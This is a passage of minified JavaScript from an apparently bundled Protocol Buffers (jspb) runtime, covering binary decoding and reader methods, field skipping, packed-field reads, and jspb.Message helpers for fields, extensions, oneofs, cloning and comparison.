        J.prototype.readInt8 = J.prototype.Xb,
        J.prototype.Vb = function() {
            var y = this.b[this.a]
              , m = this.b[this.a + 1];
            return this.a += 2,
            M(this.a <= this.c),
            (y << 0 | m << 8) << 16 >> 16
        }
        ,
        J.prototype.readInt16 = J.prototype.Vb,
        J.prototype.P = function() {
            var y = this.b[this.a]
              , m = this.b[this.a + 1]
              , S = this.b[this.a + 2]
              , G = this.b[this.a + 3];
            return this.a += 4,
            M(this.a <= this.c),
            y << 0 | m << 8 | S << 16 | G << 24
        }
        ,
        J.prototype.readInt32 = J.prototype.P,
        J.prototype.ba = function() {
            var y = this.m()
              , m = this.m();
            return Dr(y, m)
        }
        ,
        J.prototype.readInt64 = J.prototype.ba,
        J.prototype.ca = function() {
            var y = this.m()
              , m = this.m();
            return st(y, m)
        }
        ,
        J.prototype.readInt64String = J.prototype.ca,
        J.prototype.aa = function() {
            var y = this.m();
            return Te(y)
        }
        ,
        J.prototype.readFloat = J.prototype.aa,
        J.prototype.Z = function() {
            var y = this.m()
              , m = this.m();
            return Ue(y, m)
        }
        ,
        J.prototype.readDouble = J.prototype.Z,
        J.prototype.pa = function() {
            return !!this.b[this.a++]
        }
        ,
        J.prototype.readBool = J.prototype.pa,
        J.prototype.ra = function() {
            return this.da()
        }
        ,
        J.prototype.readEnum = J.prototype.ra,
        J.prototype.fa = function(y) {
            var m = this.b
              , S = this.a;
            y = S + y;
            for (var G = [], oe = ""; S < y; ) {
                var be = m[S++];
                if (128 > be)
                    G.push(be);
                else {
                    if (192 > be)
                        continue;
                    if (224 > be) {
                        var ze = m[S++];
                        G.push((be & 31) << 6 | ze & 63)
                    } else if (240 > be) {
                        ze = m[S++];
                        var at = m[S++];
                        G.push((be & 15) << 12 | (ze & 63) << 6 | at & 63)
                    } else if (248 > be) {
                        ze = m[S++],
                        at = m[S++];
                        var $r = m[S++];
                        be = (be & 7) << 18 | (ze & 63) << 12 | (at & 63) << 6 | $r & 63,
                        be -= 65536,
                        G.push((be >> 10 & 1023) + 55296, (be & 1023) + 56320)
                    }
                }
                8192 <= G.length && (oe += String.fromCharCode.apply(null, G),
                G.length = 0)
            }
            return oe += z(G),
            this.a = S,
            oe
        }
        ,
        J.prototype.readString = J.prototype.fa,
        J.prototype.Dc = function() {
            var y = this.o();
            return this.fa(y)
        }
        ,
        J.prototype.readStringWithLength = J.prototype.Dc,
        J.prototype.qa = function(y) {
            if (0 > y || this.a + y > this.b.length)
                return this.v = !0,
                k("Invalid byte length!"),
                new Uint8Array(0);
            var m = this.b.subarray(this.a, this.a + y);
            return this.a += y,
            M(this.a <= this.c),
            m
        }
        ,
        J.prototype.readBytes = J.prototype.qa,
        J.prototype.ia = function() {
            return this.w(Re)
        }
        ,
        J.prototype.readVarintHash64 = J.prototype.ia,
        J.prototype.$ = function() {
            var y = this.b
              , m = this.a
              , S = y[m]
              , G = y[m + 1]
              , oe = y[m + 2]
              , be = y[m + 3]
              , ze = y[m + 4]
              , at = y[m + 5]
              , $r = y[m + 6];
            return y = y[m + 7],
            this.a += 8,
            String.fromCharCode(S, G, oe, be, ze, at, $r, y)
        }
        ,
        J.prototype.readFixedHash64 = J.prototype.$;
        function re(y, m, S) {
            this.a = Ie(y, m, S),
            this.O = this.a.B(),
            this.b = this.c = -1,
            this.h = !1,
            this.v = null
        }
        b("jspb.BinaryReader", re, void 0);
        var Nt = [];
        re.clearInstanceCache = function() {
            Nt = []
        }
        ,
        re.getInstanceCacheLength = function() {
            return Nt.length
        }
        ;
        function Yt(y, m, S) {
            if (Nt.length) {
                var G = Nt.pop();
                return y && G.a.H(y, m, S),
                G
            }
            return new re(y,m,S)
        }
        re.alloc = Yt,
        re.prototype.zb = Yt,
        re.prototype.alloc = re.prototype.zb,
        re.prototype.Ca = function() {
            this.a.clear(),
            this.b = this.c = -1,
            this.h = !1,
            this.v = null,
            100 > Nt.length && Nt.push(this)
        }
        ,
        re.prototype.free = re.prototype.Ca,
        re.prototype.Fb = function() {
            return this.O
        }
        ,
        re.prototype.getFieldCursor = re.prototype.Fb,
        re.prototype.B = function() {
            return this.a.B()
        }
        ,
        re.prototype.getCursor = re.prototype.B,
        re.prototype.Y = function() {
            return this.a.Y()
        }
        ,
        re.prototype.getBuffer = re.prototype.Y,
        re.prototype.Hb = function() {
            return this.c
        }
        ,
        re.prototype.getFieldNumber = re.prototype.Hb,
        re.prototype.Lb = function() {
            return this.b
        }
        ,
        re.prototype.getWireType = re.prototype.Lb,
        re.prototype.Mb = function() {
            return this.b == 2
        }
        ,
        re.prototype.isDelimited = re.prototype.Mb,
        re.prototype.bb = function() {
            return this.b == 4
        }
        ,
        re.prototype.isEndGroup = re.prototype.bb,
        re.prototype.getError = function() {
            return this.h || this.a.getError()
        }
        ,
        re.prototype.getError = re.prototype.getError,
        re.prototype.H = function(y, m, S) {
            this.a.H(y, m, S),
            this.b = this.c = -1
        }
        ,
        re.prototype.setBlock = re.prototype.H,
        re.prototype.reset = function() {
            this.a.reset(),
            this.b = this.c = -1
        }
        ,
        re.prototype.reset = re.prototype.reset,
        re.prototype.advance = function(y) {
            this.a.advance(y)
        }
        ,
        re.prototype.advance = re.prototype.advance,
        re.prototype.oa = function() {
            if (this.a.ya())
                return !1;
            if (this.getError())
                return k("Decoder hit an error"),
                !1;
            this.O = this.a.B();
            var y = this.a.o()
              , m = y >>> 3;
            return y &= 7,
            y != 0 && y != 5 && y != 1 && y != 2 && y != 3 && y != 4 ? (k("Invalid wire type: %s (at position %s)", y, this.O),
            this.h = !0,
            !1) : (this.c = m,
            this.b = y,
            !0)
        }
        ,
        re.prototype.nextField = re.prototype.oa,
        re.prototype.Oa = function() {
            this.a.mb(this.c << 3 | this.b)
        }
        ,
        re.prototype.unskipHeader = re.prototype.Oa,
        re.prototype.Lc = function() {
            var y = this.c;
            for (this.Oa(); this.oa() && this.c == y; )
                this.C();
            this.a.ya() || this.Oa()
        }
        ,
        re.prototype.skipMatchingFields = re.prototype.Lc,
        re.prototype.lb = function() {
            this.b != 0 ? (k("Invalid wire type for skipVarintField"),
            this.C()) : this.a.kb()
        }
        ,
        re.prototype.skipVarintField = re.prototype.lb,
        re.prototype.gb = function() {
            if (this.b != 2)
                k("Invalid wire type for skipDelimitedField"),
                this.C();
            else {
                var y = this.a.o();
                this.a.advance(y)
            }
        }
        ,
        re.prototype.skipDelimitedField = re.prototype.gb,
        re.prototype.hb = function() {
            this.b != 5 ? (k("Invalid wire type for skipFixed32Field"),
            this.C()) : this.a.advance(4)
        }
        ,
        re.prototype.skipFixed32Field = re.prototype.hb,
        re.prototype.ib = function() {
            this.b != 1 ? (k("Invalid wire type for skipFixed64Field"),
            this.C()) : this.a.advance(8)
        }
        ,
        re.prototype.skipFixed64Field = re.prototype.ib,
        re.prototype.jb = function() {
            var y = this.c;
            do {
                if (!this.oa()) {
                    k("Unmatched start-group tag: stream EOF"),
                    this.h = !0;
                    break
                }
                if (this.b == 4) {
                    this.c != y && (k("Unmatched end-group tag"),
                    this.h = !0);
                    break
                }
                this.C()
            } while (!0)
        }
        ,
        re.prototype.skipGroup = re.prototype.jb,
        re.prototype.C = function() {
            switch (this.b) {
            case 0:
                this.lb();
                break;
            case 1:
                this.ib();
                break;
            case 2:
                this.gb();
                break;
            case 5:
                this.hb();
                break;
            case 3:
                this.jb();
                break;
            default:
                k("Invalid wire encoding for field.")
            }
        }
        ,
        re.prototype.skipField = re.prototype.C,
        re.prototype.Hc = function(y, m) {
            this.v === null && (this.v = {}),
            M(!this.v[y]),
            this.v[y] = m
        }
        ,
        re.prototype.registerReadCallback = re.prototype.Hc,
        re.prototype.Ic = function(y) {
            return M(this.v !== null),
            y = this.v[y],
            M(y),
            y(this)
        }
        ,
        re.prototype.runReadCallback = re.prototype.Ic,
        re.prototype.Yb = function(y, m) {
            M(this.b == 2);
            var S = this.a.c
              , G = this.a.o();
            G = this.a.B() + G,
            this.a.setEnd(G),
            m(y, this),
            this.a.Ma(G),
            this.a.setEnd(S)
        }
        ,
        re.prototype.readMessage = re.prototype.Yb,
        re.prototype.Ub = function(y, m, S) {
            M(this.b == 3),
            M(this.c == y),
            S(m, this),
            this.h || this.b == 4 || (k("Group submessage did not end with an END_GROUP tag"),
            this.h = !0)
        }
        ,
        re.prototype.readGroup = re.prototype.Ub,
        re.prototype.Gb = function() {
            M(this.b == 2);
            var y = this.a.o()
              , m = this.a.B()
              , S = m + y;
            return y = Ie(this.a.Y(), m, y),
            this.a.Ma(S),
            y
        }
        ,
        re.prototype.getFieldDecoder = re.prototype.Gb,
        re.prototype.P = function() {
            return M(this.b == 0),
            this.a.da()
        }
        ,
        re.prototype.readInt32 = re.prototype.P,
        re.prototype.Wb = function() {
            return M(this.b == 0),
            this.a.Ea()
        }
        ,
        re.prototype.readInt32String = re.prototype.Wb,
        re.prototype.ba = function() {
            return M(this.b == 0),
            this.a.sa()
        }
        ,
        re.prototype.readInt64 = re.prototype.ba,
        re.prototype.ca = function() {
            return M(this.b == 0),
            this.a.Fa()
        }
        ,
        re.prototype.readInt64String = re.prototype.ca,
        re.prototype.m = function() {
            return M(this.b == 0),
            this.a.o()
        }
        ,
        re.prototype.readUint32 = re.prototype.m,
        re.prototype.Fc = function() {
            return M(this.b == 0),
            this.a.O()
        }
        ,
        re.prototype.readUint32String = re.prototype.Fc,
        re.prototype.ga = function() {
            return M(this.b == 0),
            this.a.Ga()
        }
        ,
        re.prototype.readUint64 = re.prototype.ga,
        re.prototype.ha = function() {
            return M(this.b == 0),
            this.a.Ha()
        }
        ,
        re.prototype.readUint64String = re.prototype.ha,
        re.prototype.zc = function() {
            return M(this.b == 0),
            this.a.Ia()
        }
        ,
        re.prototype.readSint32 = re.prototype.zc,
        re.prototype.Ac = function() {
            return M(this.b == 0),
            this.a.Ja()
        }
        ,
        re.prototype.readSint64 = re.prototype.Ac,
        re.prototype.Bc = function() {
            return M(this.b == 0),
            this.a.Ka()
        }
        ,
        re.prototype.readSint64String = re.prototype.Bc,
        re.prototype.Rb = function() {
            return M(this.b == 5),
            this.a.m()
        }
        ,
        re.prototype.readFixed32 = re.prototype.Rb,
        re.prototype.Sb = function() {
            return M(this.b == 1),
            this.a.ga()
        }
        ,
        re.prototype.readFixed64 = re.prototype.Sb,
        re.prototype.Tb = function() {
            return M(this.b == 1),
            this.a.ha()
        }
        ,
        re.prototype.readFixed64String = re.prototype.Tb,
        re.prototype.vc = function() {
            return M(this.b == 5),
            this.a.P()
        }
        ,
        re.prototype.readSfixed32 = re.prototype.vc,
        re.prototype.wc = function() {
            return M(this.b == 5),
            this.a.P().toString()
        }
        ,
        re.prototype.readSfixed32String = re.prototype.wc,
        re.prototype.xc = function() {
            return M(this.b == 1),
            this.a.ba()
        }
        ,
        re.prototype.readSfixed64 = re.prototype.xc,
        re.prototype.yc = function() {
            return M(this.b == 1),
            this.a.ca()
        }
        ,
        re.prototype.readSfixed64String = re.prototype.yc,
        re.prototype.aa = function() {
            return M(this.b == 5),
            this.a.aa()
        }
        ,
        re.prototype.readFloat = re.prototype.aa,
        re.prototype.Z = function() {
            return M(this.b == 1),
            this.a.Z()
        }
        ,
        re.prototype.readDouble = re.prototype.Z,
        re.prototype.pa = function() {
            return M(this.b == 0),
            !!this.a.o()
        }
        ,
        re.prototype.readBool = re.prototype.pa,
        re.prototype.ra = function() {
            return M(this.b == 0),
            this.a.sa()
        }
        ,
        re.prototype.readEnum = re.prototype.ra,
        re.prototype.fa = function() {
            M(this.b == 2);
            var y = this.a.o();
            return this.a.fa(y)
        }
        ,
        re.prototype.readString = re.prototype.fa,
        re.prototype.qa = function() {
            M(this.b == 2);
            var y = this.a.o();
            return this.a.qa(y)
        }
        ,
        re.prototype.readBytes = re.prototype.qa,
        re.prototype.ia = function() {
            return M(this.b == 0),
            this.a.ia()
        }
        ,
        re.prototype.readVarintHash64 = re.prototype.ia,
        re.prototype.Cc = function() {
            return M(this.b == 0),
            this.a.fb()
        }
        ,
        re.prototype.readSintHash64 = re.prototype.Cc,
        re.prototype.w = function(y) {
            return M(this.b == 0),
            this.a.w(y)
        }
        ,
        re.prototype.readSplitVarint64 = re.prototype.w,
        re.prototype.ea = function(y) {
            return M(this.b == 0),
            this.a.w(function(m, S) {
                return le(m, S, y)
            })
        }
        ,
        re.prototype.readSplitZigzagVarint64 = re.prototype.ea,
        re.prototype.$ = function() {
            return M(this.b == 1),
            this.a.$()
        }
        ,
        re.prototype.readFixedHash64 = re.prototype.$,
        re.prototype.ta = function(y) {
            return M(this.b == 1),
            this.a.ta(y)
        }
        ,
        re.prototype.readSplitFixed64 = re.prototype.ta;
        function wt(y, m) {
            M(y.b == 2);
            var S = y.a.o();
            S = y.a.B() + S;
            for (var G = []; y.a.B() < S; )
                G.push(m.call(y.a));
            return G
        }
        re.prototype.gc = function() {
            return wt(this, this.a.da)
        }
        ,
        re.prototype.readPackedInt32 = re.prototype.gc,
        re.prototype.hc = function() {
            return wt(this, this.a.Ea)
        }
        ,
        re.prototype.readPackedInt32String = re.prototype.hc,
        re.prototype.ic = function() {
            return wt(this, this.a.sa)
        }
        ,
        re.prototype.readPackedInt64 = re.prototype.ic,
        re.prototype.jc = function() {
            return wt(this, this.a.Fa)
        }
        ,
        re.prototype.readPackedInt64String = re.prototype.jc,
        re.prototype.qc = function() {
            return wt(this, this.a.o)
        }
        ,
        re.prototype.readPackedUint32 = re.prototype.qc,
        re.prototype.rc = function() {
            return wt(this, this.a.O)
        }
        ,
        re.prototype.readPackedUint32String = re.prototype.rc,
        re.prototype.sc = function() {
            return wt(this, this.a.Ga)
        }
        ,
        re.prototype.readPackedUint64 = re.prototype.sc,
        re.prototype.tc = function() {
            return wt(this, this.a.Ha)
        }
        ,
        re.prototype.readPackedUint64String = re.prototype.tc,
        re.prototype.nc = function() {
            return wt(this, this.a.Ia)
        }
        ,
        re.prototype.readPackedSint32 = re.prototype.nc,
        re.prototype.oc = function() {
            return wt(this, this.a.Ja)
        }
        ,
        re.prototype.readPackedSint64 = re.prototype.oc,
        re.prototype.pc = function() {
            return wt(this, this.a.Ka)
        }
        ,
        re.prototype.readPackedSint64String = re.prototype.pc,
        re.prototype.bc = function() {
            return wt(this, this.a.m)
        }
        ,
        re.prototype.readPackedFixed32 = re.prototype.bc,
        re.prototype.cc = function() {
            return wt(this, this.a.ga)
        }
        ,
        re.prototype.readPackedFixed64 = re.prototype.cc,
        re.prototype.dc = function() {
            return wt(this, this.a.ha)
        }
        ,
        re.prototype.readPackedFixed64String = re.prototype.dc,
        re.prototype.kc = function() {
            return wt(this, this.a.P)
        }
        ,
        re.prototype.readPackedSfixed32 = re.prototype.kc,
        re.prototype.lc = function() {
            return wt(this, this.a.ba)
        }
        ,
        re.prototype.readPackedSfixed64 = re.prototype.lc,
        re.prototype.mc = function() {
            return wt(this, this.a.ca)
        }
        ,
        re.prototype.readPackedSfixed64String = re.prototype.mc,
        re.prototype.fc = function() {
            return wt(this, this.a.aa)
        }
        ,
        re.prototype.readPackedFloat = re.prototype.fc,
        re.prototype.$b = function() {
            return wt(this, this.a.Z)
        }
        ,
        re.prototype.readPackedDouble = re.prototype.$b,
        re.prototype.Zb = function() {
            return wt(this, this.a.pa)
        }
        ,
        re.prototype.readPackedBool = re.prototype.Zb,
        re.prototype.ac = function() {
            return wt(this, this.a.ra)
        }
        ,
        re.prototype.readPackedEnum = re.prototype.ac,
        re.prototype.uc = function() {
            return wt(this, this.a.ia)
        }
        ,
        re.prototype.readPackedVarintHash64 = re.prototype.uc,
        re.prototype.ec = function() {
            return wt(this, this.a.$)
        }
        ,
        re.prototype.readPackedFixedHash64 = re.prototype.ec;
        function zt(y, m, S, G, oe) {
            this.ma = y,
            this.Ba = m,
            this.la = S,
            this.Na = G,
            this.na = oe
        }
        b("jspb.ExtensionFieldInfo", zt, void 0);
        function zi(y, m, S, G, oe, be) {
            this.Za = y,
            this.za = m,
            this.Aa = S,
            this.Wa = G,
            this.Ab = oe,
            this.Nb = be
        }
        b("jspb.ExtensionFieldBinaryInfo", zi, void 0),
        zt.prototype.F = function() {
            return !!this.la
        }
        ,
        zt.prototype.isMessageType = zt.prototype.F;
        function Ke() {}
        b("jspb.Message", Ke, void 0),
        Ke.GENERATE_TO_OBJECT = !0,
        Ke.GENERATE_FROM_OBJECT = !0;
        var jo = typeof Uint8Array == "function";
        Ke.prototype.Ib = function() {
            return this.b
        }
        ,
        Ke.prototype.getJsPbMessageId = Ke.prototype.Ib,
        Ke.initialize = function(y, m, S, G, oe, be) {
            y.f = null,
            m || (m = S ? [S] : []),
            y.b = S ? String(S) : void 0,
            y.D = S === 0 ? -1 : 0,
            y.u = m;
            e: {
                if (S = y.u.length,
                m = -1,
                S && (m = S - 1,
                S = y.u[m],
                !(S === null || typeof S != "object" || Array.isArray(S) || jo && S instanceof Uint8Array))) {
                    y.G = m - y.D,
                    y.i = S;
                    break e
                }
                -1 < G ? (y.G = Math.max(G, m + 1 - y.D),
                y.i = null) : y.G = Number.MAX_VALUE
            }
            if (y.a = {},
            oe)
                for (G = 0; G < oe.length; G++)
                    m = oe[G],
                    m < y.G ? (m += y.D,
                    y.u[m] = y.u[m] || oo) : (ji(y),
                    y.i[m] = y.i[m] || oo);
            if (be && be.length)
                for (G = 0; G < be.length; G++)
                    ot(y, be[G])
        }
        ;
        var oo = Object.freeze ? Object.freeze([]) : [];
        function ji(y) {
            var m = y.G + y.D;
            y.u[m] || (y.i = y.u[m] = {})
        }
        function di(y, m, S) {
            for (var G = [], oe = 0; oe < y.length; oe++)
                G[oe] = m.call(y[oe], S, y[oe]);
            return G
        }
        Ke.toObjectList = di,
        Ke.toObjectExtension = function(y, m, S, G, oe) {
            for (var be in S) {
                var ze = S[be]
                  , at = G.call(y, ze);
                if (at != null) {
                    for (var $r in ze.Ba)
                        if (ze.Ba.hasOwnProperty($r))
                            break;
                    m[$r] = ze.Na ? ze.na ? di(at, ze.Na, oe) : ze.Na(oe, at) : at
                }
            }
        }
        ,
        Ke.serializeBinaryExtensions = function(y, m, S, G) {
            for (var oe in S) {
                var be = S[oe]
                  , ze = be.Za;
                if (!be.Aa)
                    throw Error("Message extension present that was generated without binary serialization support");
                var at = G.call(y, ze);
                if (at != null)
                    if (ze.F())
                        if (be.Wa)
                            be.Aa.call(m, ze.ma, at, be.Wa);
                        else
                            throw Error("Message extension present holding submessage without binary support enabled, and message is being serialized to binary format");
                    else
                        be.Aa.call(m, ze.ma, at)
            }
        }
        ,
        Ke.readBinaryExtension = function(y, m, S, G, oe) {
            var be = S[m.c];
            if (be) {
                if (S = be.Za,
                !be.za)
                    throw Error("Deserializing extension whose generated code does not support binary format");
                if (S.F()) {
                    var ze = new S.la;
                    be.za.call(m, ze, be.Ab)
                } else
                    ze = be.za.call(m);
                S.na && !be.Nb ? (m = G.call(y, S)) ? m.push(ze) : oe.call(y, S, [ze]) : oe.call(y, S, ze)
            } else
                m.C()
        }
        ;
        function jr(y, m) {
            if (m < y.G) {
                m += y.D;
                var S = y.u[m];
                return S === oo ? y.u[m] = [] : S
            }
            if (y.i)
                return S = y.i[m],
                S === oo ? y.i[m] = [] : S
        }
        Ke.getField = jr,
        Ke.getRepeatedField = function(y, m) {
            return jr(y, m)
        }
        ;
        function bs(y, m) {
            return y = jr(y, m),
            y == null ? y : +y
        }
        Ke.getOptionalFloatingPointField = bs;
        function ms(y, m) {
            return y = jr(y, m),
            y == null ? y : !!y
        }
        Ke.getBooleanField = ms,
        Ke.getRepeatedFloatingPointField = function(y, m) {
            var S = jr(y, m);
            if (y.a || (y.a = {}),
            !y.a[m]) {
                for (var G = 0; G < S.length; G++)
                    S[G] = +S[G];
                y.a[m] = !0
            }
            return S
        }
        ,
        Ke.getRepeatedBooleanField = function(y, m) {
            var S = jr(y, m);
            if (y.a || (y.a = {}),
            !y.a[m]) {
                for (var G = 0; G < S.length; G++)
                    S[G] = !!S[G];
                y.a[m] = !0
            }
            return S
        }
        ;
        function fe(y) {
            return y == null || typeof y == "string" ? y : jo && y instanceof Uint8Array ? ae(y) : (k("Cannot coerce to b64 string: " + v(y)),
            null)
        }
        Ke.bytesAsB64 = fe;
        function ye(y) {
            return y == null || y instanceof Uint8Array ? y : typeof y == "string" ? he(y) : (k("Cannot coerce to Uint8Array: " + v(y)),
            null)
        }
        Ke.bytesAsU8 = ye,
        Ke.bytesListAsB64 = function(y) {
            return Ce(y),
            y.length && typeof y[0] != "string" ? F(y, fe) : y
        }
        ,
        Ke.bytesListAsU8 = function(y) {
            return Ce(y),
            !y.length || y[0]instanceof Uint8Array ? y : F(y, ye)
        }
        ;
        function Ce(y) {
            if (y && 1 < y.length) {
                var m = v(y[0]);
                O(y, function(S) {
                    v(S) != m && k("Inconsistent type in JSPB repeated field array. Got " + v(S) + " expected " + m)
                })
            }
        }
        function Ne(y, m, S) {
            return y = jr(y, m),
            y ?? S
        }
        Ke.getFieldWithDefault = Ne,
        Ke.getBooleanFieldWithDefault = function(y, m, S) {
            return y = ms(y, m),
            y ?? S
        }
        ,
        Ke.getFloatingPointFieldWithDefault = function(y, m, S) {
            return y = bs(y, m),
            y ?? S
        }
        ,
        Ke.getFieldProto3 = Ne,
        Ke.getMapField = function(y, m, S, G) {
            if (y.f || (y.f = {}),
            m in y.f)
                return y.f[m];
            var oe = jr(y, m);
            if (!oe) {
                if (S)
                    return;
                oe = [],
                je(y, m, oe)
            }
            return y.f[m] = new Y(oe,G)
        }
        ;
        function je(y, m, S) {
            return H(y, Ke),
            m < y.G ? y.u[m + y.D] = S : (ji(y),
            y.i[m] = S),
            y
        }
        Ke.setField = je,
        Ke.setProto3IntField = function(y, m, S) {
            return nt(y, m, S, 0)
        }
        ,
        Ke.setProto3FloatField = function(y, m, S) {
            return nt(y, m, S, 0)
        }
        ,
        Ke.setProto3BooleanField = function(y, m, S) {
            return nt(y, m, S, !1)
        }
        ,
        Ke.setProto3StringField = function(y, m, S) {
            return nt(y, m, S, "")
        }
        ,
        Ke.setProto3BytesField = function(y, m, S) {
            return nt(y, m, S, "")
        }
        ,
        Ke.setProto3EnumField = function(y, m, S) {
            return nt(y, m, S, 0)
        }
        ,
        Ke.setProto3StringIntField = function(y, m, S) {
            return nt(y, m, S, "0")
        }
        ;
        function nt(y, m, S, G) {
            return H(y, Ke),
            S !== G ? je(y, m, S) : m < y.G ? y.u[m + y.D] = null : (ji(y),
            delete y.i[m]),
            y
        }
        Ke.addToRepeatedField = function(y, m, S, G) {
            return H(y, Ke),
            m = jr(y, m),
            G != null ? m.splice(G, 0, S) : m.push(S),
            y
        }
        ;
        function At(y, m, S, G) {
            return H(y, Ke),
            (S = ot(y, S)) && S !== m && G !== void 0 && (y.f && S in y.f && (y.f[S] = void 0),
            je(y, S, void 0)),
            je(y, m, G)
        }
        Ke.setOneofField = At;
        function ot(y, m) {
            for (var S, G, oe = 0; oe < m.length; oe++) {
                var be = m[oe]
                  , ze = jr(y, be);
                ze != null && (S = be,
                G = ze,
                je(y, be, void 0))
            }
            return S ? (je(y, S, G),
            S) : 0
        }
        Ke.computeOneofCase = ot,
        Ke.getWrapperField = function(y, m, S, G) {
            if (y.f || (y.f = {}),
            !y.f[S]) {
                var oe = jr(y, S);
                (G || oe) && (y.f[S] = new m(oe))
            }
            return y.f[S]
        }
        ,
        Ke.getRepeatedWrapperField = function(y, m, S) {
            return bt(y, m, S),
            m = y.f[S],
            m == oo && (m = y.f[S] = []),
            m
        }
        ;
        function bt(y, m, S) {
            if (y.f || (y.f = {}),
            !y.f[S]) {
                for (var G = jr(y, S), oe = [], be = 0; be < G.length; be++)
                    oe[be] = new m(G[be]);
                y.f[S] = oe
            }
        }
        Ke.setWrapperField = function(y, m, S) {
            H(y, Ke),
            y.f || (y.f = {});
            var G = S && S.g();
            return y.f[m] = S,
            je(y, m, G)
        }
        ,
        Ke.setOneofWrapperField = function(y, m, S, G) {
            H(y, Ke),
            y.f || (y.f = {});
            var oe = G && G.g();
            return y.f[m] = G,
            At(y, m, S, oe)
        }
        ,
        Ke.setRepeatedWrapperField = function(y, m, S) {
            H(y, Ke),
            y.f || (y.f = {}),
            S = S || [];
            for (var G = [], oe = 0; oe < S.length; oe++)
                G[oe] = S[oe].g();
            return y.f[m] = S,
            je(y, m, G)
        }
        ,
        Ke.addToRepeatedWrapperField = function(y, m, S, G, oe) {
            bt(y, G, m);
            var be = y.f[m];
            return be || (be = y.f[m] = []),
            S = S || new G,
            y = jr(y, m),
            oe != null ? (be.splice(oe, 0, S),
            y.splice(oe, 0, S.g())) : (be.push(S),
            y.push(S.g())),
            S
        }
        ,
        Ke.toMap = function(y, m, S, G) {
            for (var oe = {}, be = 0; be < y.length; be++)
                oe[m.call(y[be])] = S ? S.call(y[be], G, y[be]) : y[be];
            return oe
        }
        ;
        function mt(y) {
            if (y.f)
                for (var m in y.f) {
                    var S = y.f[m];
                    if (Array.isArray(S))
                        for (var G = 0; G < S.length; G++)
                            S[G] && S[G].g();
                    else
                        S && S.g()
                }
        }
        Ke.prototype.g = function() {
            return mt(this),
            this.u
        }
        ,
        Ke.prototype.toArray = Ke.prototype.g,
        Ke.prototype.toString = function() {
            return mt(this),
            this.u.toString()
        }
        ,
        Ke.prototype.getExtension = function(y) {
            if (this.i) {
                this.f || (this.f = {});
                var m = y.ma;
                if (y.na) {
                    if (y.F())
                        return this.f[m] || (this.f[m] = F(this.i[m] || [], function(S) {
                            return new y.la(S)
                        })),
                        this.f[m]
                } else if (y.F())
                    return !this.f[m] && this.i[m] && (this.f[m] = new y.la(this.i[m])),
                    this.f[m];
                return this.i[m]
            }
        }
        ,
        Ke.prototype.getExtension = Ke.prototype.getExtension,
        Ke.prototype.Kc = function(y, m) {
            this.f || (this.f = {}),
            ji(this);
            var S = y.ma;
            return y.na ? (m = m || [],
            y.F() ? (this.f[S] = m,
            this.i[S] = F(m, function(G) {
                return G.g()
            })) : this.i[S] = m) : y.F() ? (this.f[S] = m,
            this.i[S] = m && m.g()) : this.i[S] = m,
            this
        }
        ,
        Ke.prototype.setExtension = Ke.prototype.Kc,
        Ke.difference = function(y, m) {
            if (!(y instanceof m.constructor))
                throw Error("Messages have different types.");
            var S = y.g();
            m = m.g();
            var G = []
              , oe = 0
              , be = S.length > m.length ? S.length : m.length;
            for (y.b && (G[0] = y.b,
            oe = 1); oe < be; oe++)
                lt(S[oe], m[oe]) || (G[oe] = m[oe]);
            return new y.constructor(G)
        }
        ,
        Ke.equals = function(y, m) {
            return y == m || !(!y || !m) && y instanceof m.constructor && lt(y.g(), m.g())
        }
        ;
        function Ct(y, m) {
            y = y || {},
            m = m || {};
            var S = {}, G;
            for (G in y)
                S[G] = 0;
            for (G in m)
                S[G] = 0;
            for (G in S)
                if (!lt(y[G], m[G]))
                    return !1;
            return !0
        }
        Ke.compareExtensions = Ct;
        function lt(y, m) {
            if (y == m)
                return !0;
            if (!T(y) || !T(m))
                return typeof y == "number" && isNaN(y) || typeof m == "number" && isNaN(m) ? String(y) == String(m) : !1;
            if (y.constructor != m.constructor)
                return !1;
            if (jo && y.constructor === Uint8Array) {
                if (y.length != m.length)
                    return !1;
                for (var S = 0; S < y.length; S++)
                    if (y[S] != m[S])
                        return !1;
                return !0
            }
            if (y.constructor === Array) {
                var G = void 0
                  , oe = void 0
                  , be = Math.max(y.length, m.length);
                for (S = 0; S < be; S++) {
                    var ze = y[S]
                      , at = m[S];
                    if (ze && ze.constructor == Object && (M(G === void 0),
                    M(S === y.length - 1),
                    G = ze,
                    ze = void 0),
                    at && at.constructor == Object && (M(oe === void 0),
                    M(S === m.length - 1),
                    oe = at,
                    at = void 0),
                    !lt(ze, at))
                        return !1
                }
                return G || oe ? (G = G || {},
                oe = oe || {},
                Ct(G, oe)) : !0
            }
            if (y.constructor === Object)
                return Ct(y, m);
            throw Error("Invalid type in JSPB array")
        }
        Ke.compareFields = lt,
        Ke.prototype.Bb = function() {
            return St(this)
        }
        ,
        Ke.prototype.cloneMessage = Ke.prototype.Bb,
        Ke.prototype.clone = function() {
            return St(this)
        }
        ,
        Ke.prototype.clone = Ke.prototype.clone,
        Ke.clone = function(y) {
            return St(y)
        }
        ;
        function St(y) {
            return new y.constructor(Vt(y.g()))
        }
        Ke.copyInto = function(y, m) {
            H(y, Ke),
            H(m, Ke),
            M(y.constructor == m.constructor, "Copy source and target message should have the same type."),
            y = St(y);
            for (var S = m.g(), G = y.g(), oe = S.length = 0; oe < G.length; oe++)
                S[oe] = G[oe];
            m.f = y.f,
            m.i = y.i
        }
        ;
        function Vt(y) {
            if (Array.isArray(y)) {
                for (var m = Array(y.length), S = 0; S < y.length; S++) {
                    var G = y[S];
                    G != null && (m[S] = typeof G == "object" ? Vt(M(G)) : G)
                }
                return m
            }
            if (jo && y instanceof Uint8Array)
                return new Uint8Array(y);
            m = {};
            for (S in y)
                G = y[S],
                G != null && (m[S] = typeof G == "object" ? Vt(M(G)) : G);
            return m
        }
        Ke.registerMessageType = function(y, m) {
            m.we = y
        }
        ;
        var Ht = {
            dump: function(y) {
                return H(y, Ke, "jspb.Message instance expected"),
                M(y.getExtension, "Only unobfuscated and unoptimized compilation modes supported."),
                Ht.X(y)
            }
        };
        b("jspb.debug.dump", Ht.dump, void 0),
        Ht.X = function(y) {
            var m = v(y);
            if (m == "number" || m == "string" || m == "boolean" || m == "null" || m == "undefined" || typeof Uint8Array < "u" && y instanceof Uint8Array)
                return y;
            if (m == "array")
                return W(y),
                F(y, Ht.X);
            if (y instanceof Y) {
                var S = {};
                y = y.entries();
                for (var G = y.next(); !G.done; G = y.next())
                    S[G.value[0]] = Ht.X(G.value[1]);
                return S
            }
            H(y, Ke, "Only messages expected: " + y),
            m = y.constructor;
            var oe = {
                $name: m.name || m.displayName
            };
            for (at in m.prototype) {
